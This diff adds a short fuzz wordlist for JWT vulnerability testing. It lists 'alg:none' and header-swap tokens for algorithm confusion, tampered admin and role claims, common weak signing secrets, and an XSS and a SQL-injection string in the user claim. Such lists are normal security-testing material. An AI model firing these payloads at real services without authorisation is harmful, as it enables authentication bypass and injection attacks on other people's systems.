@@ -1,1 +1,36 @@
+# Basic fuzz tokens for JWT vulnerability testing
 
+# Algorithm confusion
+{"alg":"none","typ":"JWT"}
+
+# Claim tampering
+{"admin":true}
+{"role":"admin"}
+{"user":"victim@example.com"}
+{"exp":9999999999}
+
+# Common weak secrets
+secret
+admin
+123456
+jwtsecret
+myjwtkey
+supersecretkey
+letmein
+qwerty
+
+# Header mutation
+{"alg":"HS256","typ":"JWT"}
+{"alg":"RS256","typ":"JWT"}
+{"alg":"HS512","typ":"JWT"}
+
+# Non-standard keys
+none
+"" (empty)
+" " (space)
+null
+NULL
+
+# Injection payloads (for debug tokens)
+{"user":"<script>alert(1)</script>"}
+{"user":"' OR '1'='1"}
